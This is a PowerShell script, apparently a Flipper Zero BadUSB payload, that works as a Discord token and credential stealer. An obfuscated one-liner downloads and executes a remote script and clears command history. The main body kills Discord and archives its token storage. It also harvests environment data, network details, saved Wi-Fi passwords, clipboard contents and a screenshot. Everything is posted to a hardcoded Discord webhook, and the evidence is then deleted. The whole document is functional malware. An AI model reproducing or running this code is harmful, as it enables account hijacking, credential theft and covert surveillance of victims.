#Payload to execute in your flipperZero: this dowload, execute and clear history
#$n='i';set-alias v $n'wr';$b=[char]116;$c=[char]47;$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c);IEX (v -usebasicparsing $a'raw.githubusercontent.com/s4dic/DiscordGrabber/main/bd.ps1?token=GHSAT0AAAAAABXCYHCCGGWFF43MHDED24HEYXT6JBQ'); PSReadLine; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); exit

#CHANGE URL TO YOUR URL
  $url="https://canary.discord.com/api/webhooks/1006310197138034879/wuP_7m5tT1mhHNYIIHrOCl_01AbTQfuyvUc8kweGbokK9TaOUbj0von3LW9HAmyqiZxY" ;
#Get PC Name+Date+Time
  $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"

#Go to temp folder(For Screenshot)
cd "$env:temp";

#Get Discord Folder
  #Discord ZIP
    Add-Type -Assembly "System.IO.Compression.FileSystem" ;
  #Kill Discord
    taskkill /IM Discord.exe /F
  #Compress discord
  $compress = @{
    Path = "C:\Users\$env:UserName\AppData\Roaming\discord\Local Storage\", "C:\Users\$env:UserName\AppData\Roaming\discord\Local State", "C:\Users\$env:UserName\AppData\Local\Discord\installer.db"
    CompressionLevel = "Fastest"
    DestinationPath = "$env:temp\$namepc-Discord-Token.zip"
  }
  Compress-Archive @compress -Update
#Define zip to copy
$tokenfile = "$env:temp\$namepc-Discord-Token.zip"

# Get PC information + Wifi Password(if register)
dir env: >> "stats-$namepc.txt";
ipconfig /all >> "stats-$namepc.txt";
Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> "stats-$namepc.txt";
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim();
$_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim();
$_} | %{[PSCustomObject]@{PROFILE_NAME=$name;
PASSWORD=$pass}} | Format-Table -AutoSize >> "stats-$namepc.txt";

$Body=@{ content = "$env:computername Stats from Flipper-Zero"};
Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
# Get PC ClipBoard
echo "" >> "stats-$namepc.txt";
echo "####PC ClipBoard under this line:" >> "stats-$namepc.txt";
echo "####################################" >> "stats-$namepc.txt";
Get-Clipboard >> "stats-$namepc.txt";
echo "####################################" >> "stats-$namepc.txt";
echo "####End ClipBoard" >> "stats-$namepc.txt";

# Screenshot
function Get-ScreenCapture 
{ 
    begin { 
        Add-Type -AssemblyName System.Drawing, System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |
            Where-Object { $_.FormatDescription -eq "JPEG" }
    }
    process {
        Start-Sleep -Milliseconds 44
            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")
        Start-Sleep -Milliseconds 550
        $bitmap = [Windows.Forms.Clipboard]::GetImage() 
        $ep = New-Object Drawing.Imaging.EncoderParameters
        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)
        $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture"
        $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep)
    }
}
Get-ScreenCapture
$screencapture = echo $env:temp"\"$env:UserName"_Capture"

#UPLOAD
# Upload Discord Token
  curl.exe -i -F file=@"$tokenfile" $url
# Upload Stat
  curl.exe -F "file1=@stats-$namepc.txt" $url;
# Upload screenshot
  curl.exe -F "file2=@$screencapture.jpg" $url;

#Delete
# Delete ZIP Discord Token
del "$tokenfile"
# Delete stat
del "stats-$namepc.txt" ;
# Delete screenshot
del $screencapture* ;
exit
